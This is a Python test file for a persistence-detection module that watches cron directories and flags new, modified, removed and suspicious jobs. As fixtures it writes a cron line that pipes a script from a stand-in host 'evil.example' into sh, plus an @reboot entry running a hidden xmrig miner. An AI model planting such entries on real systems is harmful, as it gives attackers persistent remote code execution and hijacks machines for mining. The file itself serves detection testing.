from guardian.models import Severity
from guardian.modules import persistence


def _isolate(monkeypatch, tmp_path):
    cron = tmp_path / "cron.d"
    cron.mkdir()
    monkeypatch.setattr(persistence, "WATCH_DIRS", (str(cron),))
    monkeypatch.setattr(persistence, "WATCH_FILES", ())
    monkeypatch.setattr(persistence, "HOME_FILES", ())
    monkeypatch.setattr(persistence, "have", lambda c: False)
    monkeypatch.setattr(persistence, "read_text", lambda p, limit=None: _rt(p, limit))
    return cron


def _rt(p, limit):
    from pathlib import Path
    if str(p) == "/etc/ld.so.preload":
        return ""
    try:
        return Path(p).read_text()[: limit or None]
    except OSError:
        return None


def test_baseline_then_detect_changes(ctx, monkeypatch, tmp_path):
    cron = _isolate(monkeypatch, tmp_path)
    job = cron / "backup"
    job.write_text("0 2 * * * root /usr/local/bin/backup.sh\n")
    first = persistence.run(ctx)
    assert [f.check for f in first] == ["baseline"]

    assert persistence.run(ctx) == []  # nothing changed

    job.write_text("* * * * * root curl http://evil.example/x.sh | sh\n")
    (cron / "miner").write_text("@reboot root /tmp/.x/xmrig\n")
    findings = persistence.run(ctx)
    checks = sorted(f.check for f in findings)
    assert checks == ["modified-file", "new-file", "suspicious-command", "suspicious-command"]
    sus = [f for f in findings if f.check == "suspicious-command"]
    assert all(f.severity == Severity.HIGH for f in sus)

    job.unlink()
    assert {f.check for f in persistence.run(ctx)} == {"removed-file", "suspicious-command"}
